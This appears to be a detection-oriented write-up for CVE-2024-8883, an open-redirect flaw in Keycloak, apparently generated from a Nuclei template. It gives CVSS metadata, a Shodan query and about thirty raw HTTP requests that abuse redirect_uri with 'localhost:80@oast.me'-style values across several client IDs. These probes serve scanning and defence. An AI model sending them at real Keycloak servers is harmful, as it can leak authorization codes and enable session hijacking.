---
layout: "post"
cve_id: "CVE-2024-8883"
title: "Keycloak - Open Redirect"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-8883.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-8883.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "medium"
reference:
  - "https://github.com/advisories/GHSA-vvf8-2h68-9475"
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-8883"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N"
  cvss-score: 6.8
  cve-id: "CVE-2024-8883"
  cwe-id: "CWE-601"
  epss-score: 0.04474
  epss-percentile: 0.88656
metadata:
  max-request: 1
  verified: True
  shodan-query: "title:\"keycloak\""
tags:
  - "cve"
  - "cve2024"
  - "keycloak"
  - "redirect"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
A misconfiguration flaw was found in Keycloak. This issue can allow an attacker to redirect users to an arbitrary URL if a 'Valid Redirect URI' is set to http://localhost or http://127.0.0.1, enabling sensitive information such as authorization codes to be exposed to the attacker, potentially leading to session hijacking.


## üåê HTTP Request
```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=http://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=https://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=https://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=http://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/6.0
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=https://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.7 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=http://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=http://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=http://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=https://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=http://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=https://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; WOW64; rv:41.0) Gecko/20100101 Firefox/140.0.2 (x64 de)
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=http://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=https://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/3.6.10
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=http://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=https://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=http://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=http://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.5.20
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=master-realm&redirect_uri=https://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.6 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=https://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=broker&redirect_uri=http://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=https://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/5.0
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=https://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=https://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=admin-cli&redirect_uri=http://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=http://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=http://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=https://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=https://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=http://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=https://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=http://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=http://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=https://localhost:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=https://127.0.0.1:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=http://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=https://[::]:80@oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.4
Accept-Encoding: gzip
```


